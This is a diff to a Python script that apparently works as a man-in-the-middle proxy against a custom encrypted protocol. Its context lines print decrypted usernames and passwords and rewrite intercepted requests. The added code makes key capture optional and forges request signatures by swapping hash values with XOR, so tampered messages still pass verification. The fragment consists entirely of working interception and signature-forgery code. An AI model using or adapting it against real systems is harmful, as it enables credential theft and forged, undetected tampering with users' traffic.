@@ -83,8 +83,10 @@ while True:
                     f"\x1b[1mDouble-Decrypted USERNAME/PASSWORD: {subcontent}\x1b[0m")
             elif p_op.id == packet.ProtectedOperationIds.CHALLENGE:
                 subcontent: dict = json.loads(p_op.data)
-                client_rsa_keys = subcontent["keys"]
-                print(f"\x1b[1mClient public keys: {client_rsa_keys}\x1b[0m")
+                if "keys" in subcontent:
+                    client_rsa_keys = subcontent["keys"]
+                    print(
+                        f"\x1b[1mClient public keys: {client_rsa_keys}\x1b[0m")
             data = p_op.data
             value = p_op.value
             # make any changes we want to data & value
@@ -127,10 +129,15 @@ while True:
                                                  'mac': new_mac})
             if op.signature is not None:
                 new_hash = sha.hash(new_encrypted_data) >> 32
-                r = rsa.rsa_decrypt(
-                    client_rsa_keys[1], client_rsa_keys[0], op.signature[0])
-                H_r = sha.hashNC(bitset.from_number(r))
-                new_op.signature = (op.signature[0], H_r ^ new_hash)
+                if client_rsa_keys is not None:
+                    r = rsa.rsa_decrypt(
+                        client_rsa_keys[1], client_rsa_keys[0], op.signature[0])
+                    H_r = sha.hashNC(bitset.from_number(r))
+                    new_op.signature = (op.signature[0], H_r ^ new_hash)
+                else:
+                    old_hash = sha.hash(op.data) >> 32
+                    new_op.signature = (
+                        op.signature[0], op.signature[1] ^ old_hash ^ new_hash)
             req = new_op.json().encode()
             if new_op != op:
                 print(f"\x1b[2mAltered: {req}\x1b[0m")
